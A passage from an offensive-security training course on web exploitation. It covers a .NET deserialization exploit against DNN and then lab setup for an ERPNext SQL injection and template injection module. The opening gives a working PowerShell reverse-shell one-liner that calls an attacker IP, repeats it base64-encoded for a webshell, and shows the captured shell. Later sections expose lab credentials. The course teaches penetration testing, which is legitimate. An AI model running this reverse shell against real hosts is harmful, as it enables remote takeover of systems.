The following listing shows the Powershell reverse shell one-liner command we will use: 
$client = New-Object System.Net.Sockets.TCPClient('192.168.119.120',4444);$stream = 
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, 
$bytes.Length)) -ne 0){;$data = (New-Object -TypeName 
System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-
String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = 
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng
th);$stream.Flush()}; 
Listing 230 - Plaintext version of the Powershell one-liner we will use for our reverse shell. 
To avoid any possible quotation and encoding issues while passing the above complex command 
to the webshell, we are going to encode it to base64 format, since the PowerShell executable 
accepts the –EncodedCommand parameter, which instructs the interpreter to base64-decode the 
command before executing it. Please also note that PowerShell uses the Little Endian UTF-16 
encoding version, which is reflected in the iconv command in the following listing. 
kali@kali:~$ cat powershellcmd.txt  
$client = New-Object System.Net.Sockets.TCPClient('192.168.119.120',4444);$stream = 
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, 
$bytes.Length)) -ne 0){;$data = (New-Object -TypeName 
System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-
String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = 
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng
th);$stream.Flush()}; 
 
kali@kali:~$ iconv -f ASCII -t UTF-16LE powershellcmd.txt | base64 | tr -d "\n" 
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBO 
AGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYA 
OAAuADIALgAyADMAOAAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABp 
AGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQA 
ZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAg 
AD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIA 
eQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9 
ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUA 
bQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBp 
AG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0A 
IAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBn 
ACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsA 
IAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABz 
AGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoA 
QQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAk 
AHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUA 
bgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAo 
ACkAfQA7AAoA 
Listing 231 - The command used to encode our reverse shell 
 
86 (Nikhil Mittal, 2018), https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
232 
The final command we will execute from the webshell then looks like the following: 
powershell.exe -EncodedCommand 
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF
MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADIALgAyADMAOAAn
ACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQ
BhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUA
ewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AH
QAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAk
AGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcw
B0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4A
ZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4AC
AAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABi
AGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZA
ApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQA
LgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAG
QAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAw
ACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaA
AoACkAfQA7AAoA 
Listing 232 - PowerShell reverse shell we will execute in our ASPX command shell 
Finally, our exploit is complete and we successfully receive our reverse shell. 
kali@kali:~$ nc -lvp 4444 
[sudo] password for kali:  
listening on [any] 4444 ... 
connect to [192.168.119.120] from WIN-2TU088Q2N5H.localdomain [192.168.121.120] 54654 
whoami 
iis apppool\defaultapppool 
PS C:\windows\system32\inetsrv> exit 
kali@kali:~$  
Listing 233 - Our exploit has worked and we have received a shell 
7.4.1.2 Exercise 
1. 
Repeat the attack described in the previous section and obtain a reverse shell 
2. 
The original Muñoz and Mirosh presentation includes a reference to the DNN WriteFile 
function, which can be used to disclose information from the vulnerable DNN server. 
Generate an XML payload that will achieve that goal. 
7.4.1.3 ysoserial.net 
Now that we have manually analyzed and exploited this vulnerability, and have gained a thorough 
understanding of the ObjectDataProvider gadget mechanics, we need to mention a tool that can 
automate many of these tasks for us. Using the original ysoserial Java payload generator87 as 
inspiration, researcher Alvaro Muñoz also created the ysoserial.net88 payload generator that, as 
the name implies, specifically targets unsafe object deserialization in .Net applications. 
In addition to the gadget we used in this module, ysoserial.net includes additional gadgets that 
can be useful to an attacker if certain conditions are present in a vulnerable application. We 
 
87 (Chris Frohoff, 2019), https://github.com/frohoff/ysoserial 
88 (Alvaro Muñoz, 2020), https://github.com/pwntester/ysoserial.net 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
233 
strongly encourage you to inspect the payloads it offers as well as the inner workings of this tool, 
as it will enhance your knowledge and allow you to possibly exploit a variety of different .Net 
deserialization vulnerabilities. 
7.4.1.4 Extra Mile 
Although we have not discussed Java deserialization vulnerabilities in this course, it is worth 
mentioning that one such vulnerability exists in the ManageEngine Applications Manager instance 
in your lab. We encourage you to get familiar with the Java ysoserial version and try to identify 
and exploit this vulnerability. 
7.5 Wrapping Up 
In this module we analyzed a vulnerability in the DNN platform that clearly demonstrates that 
.NET applications can suffer from deserialization issues similar to any other language. Although 
deserialization vulnerabilities are arguably found more often in PHP and Java applications, we 
encourage you not to neglect this class of vulnerabilities when facing .NET applications, as they 
can prove to have a critical impact. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
234 
7.5.1.1.1 
 
8 ERPNext Authentication Bypass and Server Side 
Template Injection 
This module covers two vulnerabilities that can be used to exploit ERPNext,89 an open source 
Enterprise Resource Planning software built on the Frappe Web Framework.90 
These vulnerabilities were originally discovered in Frappe, but we will leverage the feature set in 
ERPNext to exploit them. The first vulnerability we will discuss is a standard SQL injection 
including an in-depth analysis on how the vulnerability was discovered. 
The SQL injection vulnerability will allow us to bypass authentication and access the 
Administrator console. With access to the Administrator console, we will examine a Server Side 
Template Injection91 (SSTI) vulnerability in detail. We will leverage the SSTI vulnerability to achieve 
remote code execution. Finally, we’ll wrap up by discussing how straying from the intended 
software design patterns can assist in vulnerability discovery. 
8.1 Getting Started 
In this module we will attack as an unauthenticated user and we will use a white-box approach. 
This means that we will be providing system and application credentials for debugging purposes. 
Let’s start by reverting the ERPNext virtual machine from the student control panel, where the 
credentials for the ERPNext server and application accounts are located. 
Let’s begin by configuring our environment. 
8.1.1 Configuring the SMTP Server 
In this module, we’ll need to be able to send emails as we attempt to bypass the password reset 
functionality. To do this, we will need to set Frappe to use our Kali machine as the SMTP server. 
We can log in to the ERPNext server via SSH to make the necessary changes. 
kali@kali:~$ ssh frappe@192.168.121.123 
frappe@192.168.121.123's password:  
... 
 Please access ERPNext by going to http://localhost:8000 on the host system. 
 The username is "Administrator" and password is "admin" 
 
 Do consider donating at https://frappe.io/buy 
 
 To update, login as 
 username: frappe 
 password: frappe 
 cd frappe-bench 
 bench update 
 
89 (Frappe, 2020), https://erpnext.com/ 
90 (Frappe, 2020), https://frappe.io/frappe 
91 (Portswigger, 2015), https://portswigger.net/research/server-side-template-injection 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
235 
 
frappe@ubuntu:~$  
Listing 234 - Logging in via SSH 
Next, we need to edit site_config.json (found in frappe-bench/sites/site1.local/) to match the 
contents shown in Listing 235. 
frappe@ubuntu:~$ cat frappe-bench/sites/site1.local/site_config.json  
{ 
 "db_name": "_1bd3e0294da19198", 
 "db_password": "32ldabYvxQanK4jj", 
 "db_type": "mariadb", 
 "mail_server": "<YOUR KALI IP>", 
 "use_ssl": 0, 
 "mail_port": 25, 
 "auto_email_id": "admin@randomdomain.com" 
} 
Listing 235 - site_config.json for email server 
At this point, ERPNext will send emails to our Kali system. However, we still need to configure Kali 
to listen for incoming SMTP connections. We can accomplish this using the Python smtpd 
module and the -c DebuggingServer flag to discard the messages after the smtpd server 
receives them. 
kali@kali:~$ sudo python3 -m smtpd -n -c DebuggingServer 0.0.0.0:25 
Listing 236 - Starting SMTP server on Kali 
Since we won’t need to see the contents of the emails, we can run the smtpd 
server in the background by adding “&” at the end of the command. 
With the smtpd server started, ERPNext will be able to conduct password resets. 
8.1.1.1 Exercise 
Configure the SMTP server in Kali and the ERPNext server. 
8.1.2 Configuring Remote Debugging 
We can use debugging to inspect available variables, follow the flow of code, and pause execution 
right before a crucial change. A debugger is essential when attempting to exploit SSTI 
vulnerabilities. We will be using Visual Studio Code92 to debug the ERPNext application. 
We can follow these steps to set up remote debugging: 
1. 
Install Visual Studio Code. 
2. 
Configure Frappe to debug. 
3. 
Load the code into Visual Studio Code. 
4. 
Configure Visual Studio Code to connect to the remote debugger. 
 
92 (Microsoft, 2020), https://code.visualstudio.com/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
236 
We will download and install Visual Studio Code by visiting the following link in Kali: 
https://code.visualstudio.com/docs/?dv=linux64_deb  
Listing 237 - Download URL for Visual Studio Code 
Next, we can use apt to install the .deb file. 
kali@kali:~$ sudo apt install ~/Downloads/code_1.45.1-1589445302_amd64.deb 
Reading package lists... Done 
Building dependency tree        
Reading state information... Done 
Note, selecting 'code' instead of '~/Downloads/code_1.45.1-1589445302_amd64.deb' 
... 
Listing 238 - Installing Visual Studio Code from the downloaded .deb 
Once installed, we’ll start Visual Studio Code and install the Python extension. We can do this by 
clicking on the Extensions tab on the left navigation panel and searching for “python”. To install 
the extension, we’ll select Install and wait for it to complete. 
 
Figure 174: Extensions Panel of Visual Studio Code 
The bench tool is designed to make installing, updating, and starting Frappe applications easier. 
We’ll need to reconfigure the bench93 Procfile and add a few lines of code to start Frappe and 
ERPNext with remote debugging enabled. 
To reconfigure bench, let’s return to the SSH session where we are logged in to the ERPNext 
server and install ptvsd.94 The ptvsd package is the Python Tools for Visual Studio debug server, 
which allows us to create a remote debugging connection. To install it, we can use the pip binary 
provided by bench to ensure that ptvsd is available to Frappe. 
frappe@ubuntu:~$ /home/frappe/frappe-bench/env/bin/pip install ptvsd 
... 
Successfully installed ptvsd-4.3.2 
 
93 (Frappe, 2020), https://github.com/frappe/bench#bench 
94 (Microsoft,2019), https://github.com/microsoft/ptvsd 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
237 
Listing 239 - Installing ptvsd 
Next, let’s open up the Procfile and comment out the section that starts the web server. We will 
manually start the web server later, when debugging is enabled. 
frappe@ubuntu:~$ cat /home/frappe/frappe-bench/Procfile  
redis_cache: redis-server config/redis_cache.conf 
redis_socketio: redis-server config/redis_socketio.conf 
redis_queue: redis-server config/redis_queue.conf 
#web: bench serve --port 8000 
 
socketio: /usr/bin/node apps/frappe/socketio.js 
 
watch: bench watch 
 
schedule: bench schedule 
worker_short: bench worker --queue short --quiet 
worker_long: bench worker --queue long --quiet 
worker_default: bench worker --queue default --quiet 
Listing 240 - Updating the Procfile to not start the web server 
Once ptvsd is installed, we must reconfigure the application and use ptvsd to open up a 
debugging port. We can do this by editing the following file: 
/home/frappe/frappe-bench/apps/frappe/frappe/app.py 
Listing 241 - Location of app.py 
When the “bench serve” command in Procfile is executed, the bench tool runs the app.py file. By 
editing this file, we can start the remote debugging port early in the application start up. The code 
in Listing 242 needs to be added below the “imports” in the app.py file. 
import ptvsd 
ptvsd.enable_attach(redirect_output=True) 
print("Now ready for the IDE to connect to the debugger") 
ptvsd.wait_for_attach() 
Listing 242 - Code to start the debugger 
The code above imports ptvsd into the current project, starts the debugging server 
(ptvsd.enable_attach), prints a message, and pauses execution until a debugger is attached 
(ptvsd.wait_for_attach). By default, ptvsd will start the debugger on port 5678. 
Before we start the services and web server, we must transfer the entire source code of the 
application to Kali. This will allow us to use Visual Studio Code on Kali to remotely debug the 
ERPNext application. Let’s use rsync to copy the folder to our machine. 
kali@kali:~$ rsync -azP frappe@192.168.121.123:/home/frappe/frappe-bench ./ 
frappe@192.168.121.123's password:  
... 
frappe-bench/sites/assets/css/web_form.css 
        108,418 100%  221.50kB/s    0:00:00 (xfr#48027, to-chk=46/56097) 
frappe-bench/sites/assets/js/ 
frappe-bench/sites/assets/js/bootstrap-4-web.min.js 
        231,062 100%  371.13kB/s    0:00:00 (xfr#48028, to-chk=45/56097) 
frappe-bench/sites/assets/js/bootstrap-4-web.min.js.map 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
238 
        409,026 100%  536.16kB/s    0:00:00 (xfr#48029, to-chk=44/56097) 
... 
Listing 243 - Transferring the zip file to Kali 
Once the files are transferred, we’ll open the folder in Visual Studio Code using File > Open Folder. 
When the Open Folder dialog appears, we’ll navigate to the copied frappe-bench directory and 
click OK. 
 
Figure 175: Open Folder Dialog in Visual Studio Code 
At this point, we will find the folder structure on the left panel under Explorer. 
 
Figure 176: Visual Studio Code Explorer with Folder Structure 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
239 
8.1.2.1.1 
 
Now it’s time to start up Frappe and ERPNext with the debugging port. Before we can start the 
web server, we’ll need to start the necessary services. We can run ‘bench start’ to start Redis, the 
web server, the socket.io server, and all the other dependencies required by Frappe and ERPNext. 
frappe@ubuntu:~$ cd /home/frappe/frappe-bench/ 
 
frappe@ubuntu:~/frappe-bench$ bench start 
22:35:55 system           | worker_long.1 started (pid=6314) 
22:35:55 system           | watch.1 started (pid=6313) 
22:35:55 system           | schedule.1 started (pid=6315) 
22:35:55 system           | redis_queue.1 started (pid=6316) 
22:35:55 redis_queue.1    | 6326:M 27 Nov 22:35:55.391 * Increased maximum number of 
open files to 10032 (it was originally set to 1024). 
... 
Listing 244 - Starting ERPNext using bench 
Next, we will open up another SSH terminal and start the web server from the 
/home/frappe/frappe-bench/sites directory. We can use the python binary installed by bench to 
run the bench helper. The bench helper starts the Frappe web server on port 8000. We will pass in 
the --noreload argument, which disables the Web Server Gateway Interface95 (werkzeug)96 from 
auto-reloading. Finally, we can use --nothreading to disable multithreading. 
We can also use screen or tmux instead of opening a new SSH connection. 
frappe@ubuntu:~/frappe-bench$ cd /home/frappe/frappe-bench/sites 
 
frappe@ubuntu:~/frappe-bench/sites$ ../env/bin/python 
../apps/frappe/frappe/utils/bench_helper.py frappe serve --port 8000 --noreload --
nothreading 
Now ready for the IDE to connect to the debugger 
Listing 245 - Manually starting the web server 
Now that the dependencies are running, the code base is open in Visual Studio Code, and the web 
application is awaiting a debugging connection, it’s time to connect to the remote debugger. Our 
next step is to configure the connection information in Visual Studio Code for remote debugging. 
Visual Studio Code does not initially present an option to debug a Python project. However, we 
can work around this by first opening an existing Python project. This can be done by visiting the 
Explorer section of Visual Studio Code and clicking on any Python file. We’ll use the same app.py 
file we modified earlier. 
 
95 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Web_Server_Gateway_Interface 
96 (Pallets Projects, 2020), https://palletsprojects.com/p/werkzeug/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
240 
 
Figure 177: app.py Open in Visual Studio Code 
Next, we can select the Debug panel on the left navigation panel of Visual Studio Code. 
 
Figure 178: Debug Panel Of Visual Studio Code 
With the debug panel open, we’ll click create a launch.json file at the top left. 
Next, when the debug configuration prompt appears, we can select Remote Attach and press 
I. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
241 
 
Figure 179: Selecting Remote Attach 
When the host name prompt appears, we’ll input the IP address of the ERPNext host and press 
I. 
 
Figure 180: Selecting the Remote IP 
Finally, when prompted, we’ll enter port number 5678 into the Remote Debugging port prompt and 
press I. 
 
Figure 181: Selecting the Remote Port 
Once we have completed the wizard, the configuration file will open. To complete the 
configuration, we’ll set remoteRoot to the server directory containing the application source code. 
This instructs the remote debugger to match up the folder open in Visual Studio Code 
(${workspaceFolder}) with the folder found on the remote host (/home/frappe/frappe-bench/). 
The final launch.json file should look like the one in Listing 246. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
242 
{ 
    // Use IntelliSense to learn about possible attributes. 
    // Hover to view descriptions of existing attributes. 
    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 
    "version": "0.2.0", 
    "configurations": [ 
        { 
            "name": "Python: Remote Attach", 
            "type": "python", 
            "request": "attach", 
            "port": 5678, 
            "host": "<Your_ERPNext_IP>", 
            "pathMappings": [ 
                { 
                    "localRoot": "${workspaceFolder}", 
                    "remoteRoot": "/home/frappe/frappe-bench/" 
                } 
            ] 
        } 
    ] 
} 
Listing 246 - launch.json final configuration 
Next, we can press C+s to save the file. When we’re ready to start the web server with remote 
debugging, we’ll enter % or click the green “play” button. 
 
Figure 182: Starting the Debugging Connection 
With the debugger connected, let’s verify in the SSH console that the application is available on 
port 8000. 
frappe@ubuntu:~/frappe-bench/sites$ ../env/bin/python 
../apps/frappe/frappe/utils/bench_helper.py frappe serve --port 8000 --noreload --
nothreading 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
243 
Now ready for the IDE to connect to the debugger 
 * Running on http://0.0.0.0:8000/ (Press CTRL+C to quit) 
Listing 247 - Web server showing a successful connection 
The application is now running with remote debugging enabled. We can test this by setting a 
breakpoint, loading a page, and confirming that debugger reaches the breakpoint. Let’s set it in 
apps/frappe/frappe/handler.py in the handle function, which manages each request from the 
browser. We can place the breakpoint by clicking on the empty space to the left of the line 
number. A red dot will appear. 
 
Figure 183: Setting a breakpoint 
Next, we will load the application in our web browser by visiting the remote IP address on port 
8000. The browser should pause as the page loads and line 15 is highlighted in Visual Studio 
Code. 
 
Figure 184: Pausing on Breakpoint 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
244 
8.1.2.1.2 
 
We can click the Continue button to resume execution. 
 
Figure 185: Resume Execution 
At this point, the page should load. Let’s remove the breakpoint by clicking on the red dot. 
8.1.2.2 Exercise 
Configure remote debugging in Kali and the ERPNext server. 
8.1.3 Configuring MariaDB Query Logging 
We can also configure database logging to make debugging the application easier. ERPNext uses 
MariaDB, an open source fork of MySQL, as its database. Configuring logging is identical to 
setting up logging in MySQL. 
To configure logging, we will open a new SSH connection and edit the MariaDB server 
configuration file located at /etc/mysql/my.cnf, which is similar to a MySQL configuration file. 
With the file open, we will uncomment the following lines under the “Logging and Replication” 
section: 
frappe@ubuntu:~$ sudo nano /etc/mysql/my.cnf 
 
[mysqld] 
... 
general_log_file        = /var/log/mysql/mysql.log 
general_log             = 1 
Listing 248 - Editing the MySQL server configuration file to log all queries 
After modifying the configuration file, we’ll need to restart the MySQL server in order to apply the 
change. 
frappe@ubuntu:~$ sudo systemctl restart mysql 
Listing 249 - Restarting the MySQL server to apply the new configuration 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
245 
Next, we can use the tail command to follow the MariaDB logfile and inspect all queries being 
executed by the web application as they happen. 
frappe@ubuntu:~$ sudo tail -f /var/log/mysql/mysql.log 
   19 Init DB   _1bd3e0294da19198 
   19 Query     select `value` from 
        `tabSingles` where `doctype`='System Settings' and `field`='enable_scheduler' 
   19 Quit 
   20 Connect   _1bd3e0294da19198@localhost as anonymous on  
   20 Query     SET AUTOCOMMIT = 0 
   20 Init DB   _1bd3e0294da19198 
   20 Query     select `value` from 
        `tabSingles` where `doctype`='System Settings' and `field`='enable_scheduler' 
   20 Quit 
   21 Connect   _1bd3e0294da19198@localhost as anonymous on  
   21 Query     SET AUTOCOMMIT = 0 
   21 Init DB   _1bd3e0294da19198 
   21 Query     select `value` from 
        `tabSingles` where `doctype`='System Settings' and `field`='enable_scheduler' 
   21 Quit 
   22 Connect   _1bd3e0294da19198@localhost as anonymous on  
   22 Query     SET AUTOCOMMIT = 0 
   22 Init DB   _1bd3e0294da19198 
   22 Query     select `value` from 
        `tabSingles` where `doctype`='System Settings' and `field`='enable_scheduler' 
... 
Listing 250 - Finding all queries being executed by ERPNext and Frappe 
The log contains SQL queries, which indicates that the configuration is working as expected. If the 
queries are not showing up, with the ERPNext application running, the first troubleshooting step is 
to visit a page and navigate around. If queries still are not showing up, we can go back and review 
/etc/mysql/my.cnf to ensure that the general_log_file and general_log entries are properly set. 
8.1.3.1 Exercise 
Configure MariaDB logging in the ERPNext server. 
8.2 Introduction to MVC, Metadata-Driven Architecture, and HTTP 
Routing 
Before we start injecting SQL and popping shells, we should familiarize ourselves with the Model-
View-Controller design pattern, Metadata-driven architecture, and HTTP routing. These concepts 
will teach us how to read the Frappe and ERPNext code and discover vulnerabilities within the 
code base. 
8.2.1 Model-View-Controller Introduction 
To introduce the concept of the Model-View-Controller design pattern, let’s consider an old Point-
of-Sale (PoS) system which is navigated with A and E+A. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
246 
A cashier uses an input device to key in purchases. The PoS system will then process the order, 
calculate the tax, and store it in a database. This system can also print an invoice as output. In 
mathematical terms, this input-process-output97 process is known as a function machine. 
 
Figure 186: Input-Process-Ouput Machine 
While the example above might not be difficult to program, once we start adding in different 
product types and taxing systems, hundreds of stores, and thousands of users, the application 
starts to get daunting and might result in “spaghetti code”. Spaghetti code is source code that is 
unstructured and difficult to maintain.98 
To prevent spaghetti code, the Model-View-Controller (MVC) software design pattern was created 
by Trygve Reenskaug in 1979.99 Reenskaug said “MVC was conceived as a general solution to the 
problem of users controlling a large and complex data set” and it is used to “bridge the gap 
between the human user’s mental model and the digital model that exists in the computer.”100 
The MVC software design pattern helps organize project code to increase reusability.101 From a 
security perspective, the benefit of increased reusability is that the code only has to be written 
securely once. For example, if a developer manually interacts with an SQL database, they may 
inadvertently (and insecurely) concatenate the SQL statement with client-provided data, resulting 
in SQL injection. Instead, in an MVC architecture, the data is pulled once from a central location 
and reused throughout the application. 
As the name suggests, the MVC design pattern is separated into three components: the model, 
the view, and the controller. 
In the context of a web application, the controller handles the input received from the user. This 
could be in the form of a HTTP route (i.e /user/update) or via a parameter 
 
97 (Ootips, 1998), http://ootips.org/mvc-pattern.html 
98 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Spaghetti_code 
99 (Norfolk, 2015), https://www.youtube.com/watch?v=o_TH-Y78tt4&t=1667 
100 (Reenskaug, 1979), http://heim.ifi.uio.no/~trygver/themes/mvc/mvc-index.html 
101 (Apple, 2018), https://developer.apple.com/library/archive/documentation/General/Conceptual/DevPedia-CocoaCore/MVC.html 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
247 
(i.e. /me?action=update). Regardless of the input method, the controller maps the user’s input to 
the function(s) that will be executed.102 Any user input logic is handled by the controller.103 
The model in Model-View-Controller maps data to a specific object and defines the logic that is 
needed to process the data.104 The model is the central component of “bridg[ing] the gap between 
the human user’s mental model and the digital model”.105 A user object or a product object is an 
example of a model. A model object’s variables will commonly match the columns found in a 
database table.106 
The view is the final output that is provided to the user. In the context of a web application, this 
can be the HTML, XML, or any other final representation that is provided to the user to be 
consumed.107 Web frameworks will typically provide the option of using a templating engine to 
render data provided from the model to the user. We will get into more details of a templating 
engine later in this module. 
To put it all together, 
1. 
The user interacts with a website’s view and the interaction is sent as a request to the 
controller. 
2. 
The controller parses the user’s interaction and requests the data from the model. 
3. 
The model provides the requested data. 
4. 
The controller renders a view using the provided data and responds back to the user. 
This cycle continues as long as the user is interacting with the web application. 
 
Figure 187: MVC Interaction 
 
102 (Norfolk, 2015), https://www.youtube.com/watch?v=o_TH-Y78tt4&t=1667 
103 (Reenskaug, 1979), http://heim.ifi.uio.no/~trygver/1979/mvc-2/1979-12-MVC.pdf 
104 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller 
105 (Reenskaug, 1979), http://heim.ifi.uio.no/~trygver/themes/mvc/mvc-index.html 
106 (Laravel, 2020), https://laravel.com/docs/5.0/eloquent 
107 (CakePHP, 2020), https://book.cakephp.org/2/en/cakephp-overview/understanding-model-view-controller.html 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
248 
8.2.1.1.1 
 
One very important thing to note is that MVC was not originally intended for web applications. 
Instead, as MVC rose in popularity for GUI applications, web applications started to adopt it.108 
However, there are endless debates on how to properly adopt MVC for web applications since the 
boundaries for model, view, and controller are not strictly enforceable. This confusion can lead to 
vulnerabilities in modern web applications. 
The Frappe framework and ERPNext application follow the MVC design pattern in some 
components.109 Below is a quote from Frappe’s DocType110 documentation: 
DocType is the basic building block of an application and encompasses all the 
three elements i.e. model, view and controller. It represents a: 
Table in the database Form in the application Controller (class) to execute 
business logic 
While this documentation explains that a DocType contains a Model (table in the database), View 
(Form in the application), and Controller, it also talks about a DocType as a building block of an 
application and not the entirety of the application itself. This means that Frappe is using MVC in 
DocTypes but also suggests that MVC is not used at lower levels of the application. To further 
